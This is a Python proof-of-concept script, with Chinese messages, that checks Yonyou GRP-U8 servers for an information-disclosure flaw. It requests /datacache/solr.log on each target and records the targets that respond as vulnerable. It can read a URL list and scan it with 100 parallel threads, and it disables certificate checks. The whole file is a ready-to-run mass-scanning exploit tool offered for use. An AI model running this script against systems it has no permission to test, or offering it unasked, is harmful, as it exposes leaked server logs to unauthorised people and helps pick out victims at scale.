# 用友GRP-U8存在信息泄露
import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
                                       author:MOYV                                                                                                                                    
    """
    print(test)

def poc(target):
    api_payload = '/datacache/solr.log'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
    }
    try:
        res = requests.get(url=target + api_payload, headers=headers, verify=False, timeout=10)
        if res.status_code == 200 and 'name' in res.text:
            print(f"[+]{target}存在信息泄露")
            with open('result.txt', 'a') as f:
                f.write(f"{target}存在信息泄露\n")
        else:
            print(f"[-]{target}不存在信息泄露")
    except:
        print(f"[!]{target}可能存在问题，请手动检测")

def main():
    banner()
    parser = argparse.ArgumentParser(description='用友GRP-U8存在信息泄露漏洞脚本')
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()